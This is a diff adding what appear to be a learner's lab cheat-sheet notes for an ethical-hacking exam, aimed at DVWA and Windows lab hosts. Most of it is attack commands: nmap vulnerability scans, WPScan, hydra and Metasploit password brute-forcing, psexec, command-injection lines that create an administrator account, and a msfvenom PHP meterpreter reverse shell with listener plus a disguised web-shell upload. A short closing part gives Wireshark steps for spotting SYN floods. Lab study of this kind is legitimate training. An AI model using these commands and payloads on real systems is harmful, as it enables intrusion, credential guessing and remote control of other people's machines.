@@ -1,0 +1,128 @@
+Nmap command::
+---------------
+
+Nmap -O <IP>
+namap -sT -O -v 192.168.92.143
+nmap -p 445 -A 192.168.1.101
+nmap --script smb-vuln* -p 445 192.168.1.101
+
+
+To get Domain useraccount::
+----------------------------
+> wmic useraccount get name,sid
+OR
+
+Use AD explorer ( https://download.sysinternals.com/files/AdExplorer.zip )
+
+OR
+> net user
+> net localuser
+
+To decrypt DES(ECB) use::
+------------------------
+Cyberchef ( https://gchq.github.io/CyberChef/ ) or Cryptool ( https://www.cryptool.org/en/ )
+
+To perform steganalysis on the txt file::
+------------------------------------------
+Snow Link: http://www.darkside.com.au/snow/snwdos32.zip
+
+snow -C -p "password" snow_example_encrypted.txt
+
+OR 
+use CryptoForge ( https://www.cryptoforge.com/download/CryptoForge.exe )
+
+To perform WPScan::
+-------------------
+
+wpscan --url https://example/ --enumerate u
+wpscan --url https://example/ --passwords wordlist.txt --usernames samson
+
+
+use auxiliary/scanner/http/wordpress_login_enum
+set PASS_FILE /root/Desktop/Wordlists/Passwords.txt
+set RHOSTS [IP Address of Windows Server 2012]
+set RPORT 8080
+set TARGETURI http://[IP Address of Windows Server 2012]:8080/CEH/
+set USERNAME admin
+Run
+
+
+
+Use burpsuite
+Status=302 length 1131
+
+
+-------------------
+| hostname
+| whoami
+| user, group, and privileges
+| tasklist
+| dir C:\
+| net user
+| net user Test /Add
+| net user
+| net user Test
+| net localgroup Administrators Test /Add
+| net user Test
+Now
+type file.txt (linux =cat)
+use the user Test for remote connection
+
+Use File Upload Vulnerability in DVWA platform and read a file from server (Web App File Upload Exploitation)::
+----------------------------------------------------------------------------------------------------------------
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw
+Msfconsole
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.92.131
+set lport 4444
+run
+
+
+DVWA Security Low
+DVWA Security Medium
+Need to use burpsuite
+DVWA Security High
+
+GIF98
+|copy C:\wamp64\www\DVWA\hackable\uploads\upload.jpg C:\wamp64\www\DVWA\hackable\uploads\shell.php
+Nc -nvlp 4444
+|cp /var/www/dvwa/hackable/uploads/hack.jpg /var/www/dvwa/hackable/uploads/hack2.php
+
+
+
+nmap --script vuln 192.168.31.1
+nmap -p 445 -A 192.168.1.101
+nmap --script smb-vuln* -p 445 IP
+nmap --script smb-os-discovery.nse -p 445 IP
+
+
+nmap -sU -p 161 --script=snmp-brute 10.10.10.12
+use auxiliary/scanner/snmp/snmp_login
+set RHOSTS 10. 10.10.12
+exploit 
+
+OR use below command
+use auxiliary/scanner/snmp/snmp_enum
+
+OR use below command
+hydra -L user.txt -P pass.txt 192.168.1.101 smb
+use exploit/windows/smb/psexec
+
+
+
+DDOS:: 
+----
+tcp.flags.syn == 1 , tcp.flags.syn == 1 and tcp.flags.ack == 0
+
+To Detect the DDOS attack::
+--------------------------
+go to statistics > IPv4 statistics > source and destination addresses
+
+
+To Find the infected files download::
+------------------------------------
+files > export > HTTP objects list
+To find the hash of the file us
+HashMyFiles
+
